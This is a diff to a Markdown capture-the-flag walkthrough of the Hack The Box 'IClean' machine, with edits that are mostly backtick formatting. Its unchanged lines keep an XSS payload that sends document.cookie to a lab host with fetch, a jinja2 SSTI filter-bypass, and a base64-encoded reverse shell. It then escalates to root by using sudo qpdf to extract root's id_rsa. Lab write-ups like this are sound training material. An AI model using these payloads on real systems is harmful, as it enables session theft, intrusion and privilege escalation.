@@ -69,7 +69,7 @@ Ports `22` and `80` open, nothing out of the ordinary.
 
 Proceed to list the website, but doing so redirects us to the next domain:
 
--> capiclean.htb. 
+`-> capiclean.htb.` 
 
 So we added it to the /etc/hosts to be able to access:
 
@@ -82,7 +82,7 @@ So we added it to the /etc/hosts to be able to access:
 
 <br />
 
-We relist the website and find a fairly straightforward page and another with a login where we try default credentials like admin:admin but nothing: 
+We relist the website and find a fairly straightforward page and another with a login where we `try default credentials` like admin:admin but nothing: 
 
 <br />
 
@@ -94,7 +94,7 @@ We relist the website and find a fairly straightforward page and another with a 
 
 <br />
 
-We kept looking and found another page a little more interesting with an user input in the /quote path:
+We kept looking and found another page a little more interesting with an `user input` in the `/quote` path:
 
 <br />
 
@@ -102,7 +102,7 @@ We kept looking and found another page a little more interesting with an user in
 
 <br />
 
-As always when we have an input, we intercept the request with Burp Suite and start testing different types of vulnerabilities such as SQL Injection, XSS...
+As always when we have an input, we `intercept the request with Burp Suite` and start `testing different types of vulnerabilities` such as SQL Injection, XSS...
 
 <br />
 
@@ -114,7 +114,7 @@ As always when we have an input, we intercept the request with Burp Suite and st
 
 <br />
 
-After several tests we are able to receive a request by GET from the server exploiting an XSS:
+After several tests we are able to `receive a request by GET` from the server `exploiting an XSS`:
 
 Payload -> `<img src="http://10.10.14.13/testing.png"></img>`
 
@@ -134,7 +134,7 @@ Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
 
 <br />
 
-We have an XSS so to take advantage of it we built a payload with fetch to try to steal the cookies from some admin who is behind the web loading our malicious code:
+`We have an XSS` so to take advantage of it we built a payload with fetch to `try to steal the cookies` from some admin who is behind the web loading our malicious code:
 
 Payload -> `<img src=x onerror=fetch("http://10.10.14.13/+document.cookie")></img>`
 
@@ -158,7 +158,7 @@ Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
 
 <br />
 
-Fuzzed the web a bit to see if we could find a path where we could use our new cookies and discovered the /dashboard path.
+Fuzzed the web a bit to see if we could find a path where we could use our new cookies and discovered the `/dashboard path`.
 
 <br />
 
@@ -168,7 +168,7 @@ Fuzzed the web a bit to see if we could find a path where we could use our new c
 
 <br />
 
-Once we have discovered this path, we set the cookies and access it, managing to enter what appears to be the website's administration panel:
+Once we have discovered this path, we set the cookies and access it, managing to enter what appears to be the `website's administration panel`:
 
 <br />
 
@@ -184,7 +184,7 @@ Once we have discovered this path, we set the cookies and access it, managing to
 
 <br />
 
-The panel we have accessed consists of 4 different pages, so we will investigate them 1 by 1 to better understand how the website works and identify any vulnerabilities:
+The panel we have accessed consists of `4 different pages`, so we will `investigate them 1 by 1 to better understand` how the website works and identify any vulnerabilities:
 
 <br />
 
@@ -192,7 +192,7 @@ The panel we have accessed consists of 4 different pages, so we will investigate
 
 <br />
 
-Access the /InvoiceGenerator path and fill in the data:
+Access the `/InvoiceGenerator` path and fill in the data:
 
 <br />
 
@@ -212,7 +212,7 @@ Click on generate and it returns the ID of the generated invoice:
 
 <br />
 
-We access the /QRGenerator and with the invoice ID we generate a QR Code:
+We access the `/QRGenerator` and with the invoice ID we generate a QR Code:
 
 <br />
 
@@ -252,8 +252,7 @@ Click on submit and we access a url with the invoice we have generated:
 
 <br />
 
-Now that we have seen in detail how the website works, we proceed to intercept with Burp Suite the request of the /QRGenerator and when we send it we see in the response the raw
-base64 encoded image:
+Now that we have seen in detail how the website works, we proceed to `intercept with Burp Suite` the request of the `/QRGenerator` and when we send it we see in the response the `raw base64 encoded image`:
 
 <br />
 
@@ -261,7 +260,7 @@ base64 encoded image:
 
 <br />
 
-We try to manipulate the "qr_link" field and we see it reflected in the response:
+We try to `manipulate the "qr_link" field` and we see it reflected in the response:
 
 <br />
 
@@ -270,7 +269,7 @@ We try to manipulate the "qr_link" field and we see it reflected in the response
 <br />
 
 
-We're being able to see our output reflected, so the first vulnerability that comes to mind is an SSTI, let's test it with a simple operation like {{7*7}}:
+We're being able to see our `output reflected`, so the first vulnerability that comes to mind is an `SSTI`, let's test it with a simple operation like `{{7*7}}`:
 
 <br />
 
@@ -278,7 +277,7 @@ We're being able to see our output reflected, so the first vulnerability that co
 
 <br />
 
-Did it! The result of the operation is reflected in the output, so let's try to execute a command in the victim machine with one of the most typical jinja2 payloads to bypass the most common filters:
+Did it! The result of the `operation is reflected in the output`, so let's try to execute a command in the victim machine with one of the most `typical jinja2 payloads to bypass the most common filters`:
 
 `Payload`:
 
@@ -292,9 +291,9 @@ Did it! The result of the operation is reflected in the output, so let's try to 
 
 <br />
 
-Perfect! We have an RCE, we are going to establish a Reverse Shell to gain access to the Machine.
+Perfect! `We have an RCE`, we are going to establish a `Reverse Shell` to gain access to the Machine.
 
-In this case, the typical bash Reverse Shell doesn't work, I think it's because some characters conflict, so to avoid this we'll base64 encode our payload:
+In this case, the `typical bash Reverse Shell` doesn't work, I think it's because some characters conflict, so to avoid this we'll `base64 encode our payload`:
 
 <br />
 
@@ -319,7 +318,7 @@ Once we have our payload encoded, we will simply have to enter it into the jinja
 
 <br />
 
-Receive the Reverse Shell as the user www-data:
+Receive the Reverse Shell as the user `www-data`:
 
 <br />
 
@@ -339,7 +338,7 @@ www-data@iclean:/opt/app$
 
 <br />
 
-Properly sanitize the tty so that it is fully functional:
+Properly `sanitize the tty` so that it is fully functional:
 
 <br />
 
@@ -363,7 +362,7 @@ Intrusion ready! Let's go with the Privilege Escalation!
 
 <br />
 
-Once inside the system, we realize that there is a user named Consuela, but when we try to enter their directory it tells us that permission denied:
+Once inside the system, we realize that there is a user named `consuela`, but when we try to enter their directory it tells us that permission denied:
 
 <br />
 
@@ -381,7 +380,7 @@ www-data@iclean:/home$
 
 <br />
 
-We continue to list the system and find a file "app.py" with credentials to log into a database:
+We continue to list the system and find a file `"app.py"` with credentials to `log into a database`:
 
 <br />
 
@@ -430,7 +429,7 @@ mysql> show tables;
 
 <br />
 
-As we can see, we have a table that looks quite interesting, the users table, so let's see its contents:
+As we can see, we have a table that looks quite interesting, the `users table`, so let's see its contents:
 
 <br />
 
@@ -447,8 +446,8 @@ mysql> select * from users;
 
 <br />
 
-We have found a hash for the user we want to pivot to, so we crack it in [crackstation.net](https://crackstation.net/) and we have a credential!!
-
+We have `found a hash` for the user we want to pivot to, so we `crack it` in [crackstation.net](https://crackstation.net/) and we have a `credential`!!
+ 
 <br />
 
 ![20](../../../assets/images/IClean/20.png)
@@ -474,7 +473,7 @@ eba486700e25313333bb89fe31xxxxxx
 
 <br />
 
-Once we became consuela, proceed to list her SUDOERS privileges:
+Once we became `consuela`, proceed to list her `SUDOERS privileges`:
 
 <br />
 
@@ -490,9 +489,9 @@ User consuela may run the following commands on iclean:
 
 <br />
 
-The user consuela can run the binary qpdf as any user on the system, including the superuser root. To do it we need the password of consuela, but we have it :D.
+The user consuela can `run the binary qpdf` as any user on the system, including the superuser `root`. To do it we need the password of consuela, but we have it :D.
 
-So proceed to list the use of this binary to try to take advantage of the privilege:
+So proceed to `list the use of this binary` to try to take advantage of the privilege:
 
 <br />
 
@@ -529,7 +528,7 @@ For detailed help, visit the qpdf manual: https://qpdf.readthedocs.io
 
 <br />
 
-The version of qpdf in use does not have any vulnerabilities, but the fact that we can run it as root is dangerous, since by executing the following command we can access any file on the machine:
+The version of qpdf in use does not have any vulnerabilities, but the fact that we can run it as root is dangerous, since by executing the following command we can `access any file on the machine`:
 
 <br />
 
@@ -577,7 +576,7 @@ startxref
 ```
 <br />
 
-That's great! The command has been successfully executed, so we're going to take the file to local so that we can open it with "open" and access the embedded root id_rsa:
+That's great! The command has been successfully executed, so we're going to take the file to local so that we can open it with `"open"` and access the `embedded root id_rsa`:
 
 <br />
 
@@ -589,7 +588,7 @@ The document does not contain any pages:
 
 <br />
 
-But if we expand the sidebar and access the attachments we can see the id_rsa of the root user:
+But if we `expand the sidebar` and access the attachments we can see the `id_rsa of the root user`:
 
 <br />
 
@@ -597,7 +596,7 @@ But if we expand the sidebar and access the attachments we can see the id_rsa of
 
 <br />
 
-Try to connect to the machine with the id_rsa we just got and that's it! Machine ready!!
+Try to `connect` to the machine with the `id_rsa` we just got and that's it! Machine ready!!
 
 <br />
 
